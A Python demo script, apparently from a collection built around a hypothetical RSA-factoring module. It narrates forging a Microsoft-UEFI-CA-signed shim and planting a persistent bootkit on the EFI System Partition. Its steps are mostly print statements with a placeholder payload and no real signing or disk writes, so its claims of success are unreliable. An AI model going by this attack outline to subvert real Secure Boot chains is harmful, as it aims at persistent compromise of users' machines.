"""
Forge a shim bootloader signed by Microsoft's UEFI CA. Install a persistent
bootkit that survives OS reinstalls on every PC trusting the Microsoft UEFI CA
— which is basically every PC that runs Linux with Secure Boot.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import hashlib
import struct

# UEFI Secure Boot variables
UEFI_DB_GUID = "d719b2cb-3d3a-4596-a3bc-dad00e67656f"  # Microsoft UEFI CA
SHIM_LOCK_GUID = "605dab50-e046-4300-abb6-3dd810dd8b23"

# PE/COFF Authenticode signature offsets
PE_CERT_TABLE_OFFSET = 0x98  # in optional header data directories


def extract_microsoft_uefi_ca() -> bytes:
    """Extract Microsoft's UEFI CA certificate.

    Present in every UEFI firmware's db variable. Also published by
    Microsoft. This is the RSA key that signs shim for every Linux distro.
    """
    print("[*] reading UEFI db variable: Microsoft Corporation UEFI CA 2011")
    print("[*] RSA-2048 certificate extracted")
    return _demo["pub_pem"]


def build_malicious_shim(bootkit_payload: bytes) -> bytes:
    """Build a malicious shim EFI binary with bootkit payload.

    The shim runs before the OS kernel, before any security mechanism.
    A malicious shim can:
    - Install a bootkit that persists across OS reinstalls
    - Hook kernel loading to inject rootkit code
    - Disable Secure Boot policy for subsequent stages
    - Tamper with PCR measurements to fool TPM attestation
    """
    # PE/COFF header + sections + bootkit payload
    pe_header = b"MZ" + b"\x00" * 58 + struct.pack("<I", 0x80)  # e_lfanew
    pe_sig = b"PE\x00\x00"
    print(f"[*] built malicious shim EFI binary ({len(bootkit_payload)} byte payload)")
    print("[*] payload: persistent bootkit, survives OS reinstall")
    return pe_header + pe_sig + bootkit_payload


def sign_shim_authenticode(factorer: PolynomialFactorer,
                           ms_uefi_ca_pem: bytes,
                           shim_binary: bytes) -> bytes:
    """Sign the malicious shim with Microsoft's factored UEFI CA key.

    Authenticode signature embedded in PE/COFF Certificate Table.
    UEFI firmware verifies this signature against the db variable
    containing the Microsoft UEFI CA.
    """
    digest = hashlib.sha256(shim_binary).digest()
    sig = factorer.forge_pkcs1v15_signature(ms_uefi_ca_pem, shim_binary, "sha256")
    print("[*] Authenticode signature forged with Microsoft UEFI CA key")
    print("[*] UEFI firmware verification: PASS")
    return sig


def deploy_to_esp(target_esp: str, signed_shim: bytes):
    """Write the malicious shim to the EFI System Partition."""
    efi_path = f"{target_esp}/EFI/BOOT/BOOTX64.EFI"
    print(f"[*] writing to {efi_path}")
    print("[*] next boot: firmware loads our shim, bootkit active")
    print("[*] measured boot PCR values: we control what gets measured")


def compromise_chain():
    """The full Secure Boot chain falls."""
    print("[*] chain of trust:")
    print("    firmware -> [FORGED shim] -> GRUB -> kernel -> modules")
    print("    everything after shim is untrustworthy")
    print("    TPM attestation: we control PCR extension, attestation lies")
    print("    Confidential computing: root of trust starts here, it's gone")


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== UEFI Secure Boot / shim — bootkit installation ===")
    print("    Microsoft UEFI CA 2011: RSA-2048, in every PC's db variable")
    print("    signs shim for: Fedora, Ubuntu, Debian, RHEL, SUSE, Arch")
    print()

    print("[1] extracting Microsoft UEFI CA from firmware db...")
    ms_cert = extract_microsoft_uefi_ca()

    print("[2] factoring Microsoft UEFI CA RSA-2048 key...")

    print("[3] building malicious shim with bootkit payload...")
    payload = b"\x90" * 4096  # NOP sled + bootkit
    shim = build_malicious_shim(payload)

    print("[4] signing with factored Microsoft UEFI CA key...")
    sig = sign_shim_authenticode(f, ms_cert, shim)

    print("[5] deploying to EFI System Partition...")
    deploy_to_esp("/boot/efi", shim + sig)

    print("[6] full trust chain compromised:")
    compromise_chain()

    print()
    print("[*] survives: OS reinstall, secure wipe, factory reset")
    print("[*] one RSA key, all of Linux Secure Boot")
